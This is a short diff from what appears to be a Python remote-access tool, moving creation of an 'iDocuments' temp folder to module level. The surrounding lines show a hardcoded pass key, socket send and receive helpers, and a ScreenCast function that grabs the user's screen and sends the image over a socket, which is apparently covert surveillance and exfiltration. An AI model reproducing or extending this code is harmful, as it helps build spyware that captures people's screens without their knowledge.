@@ -17,6 +17,8 @@ loggingState = False
 passKey = r'1705a7f91b40320a19db18912b72148e'
 tmpFolder = os.path.join(os.path.expanduser('~'), 'iDocuments')
 
+if not os.path.exists(tmpFolder):
+    os.makedirs(tmpFolder)
 
 def Send(sock, cmd, end="[ENDOFMESSAGE]"):
     sock.sendall((cmd + end).encode('utf-8'))
@@ -34,8 +36,6 @@ def Receive(sock, end="[ENDOFMESSAGE]"):
     return data[:-len(end)].decode('utf-8')
 
 def ScreenCast():
-    if not os.path.exists(tmpFolder):
-        os.makedirs(tmpFolder)
     try:
         ImageGrab.grab().save(os.path.join(tmpFolder, "tmp.jpg"), "JPEG")
         Send(s, open(os.path.join(tmpFolder, "tmp.jpg"), 'rb').read())
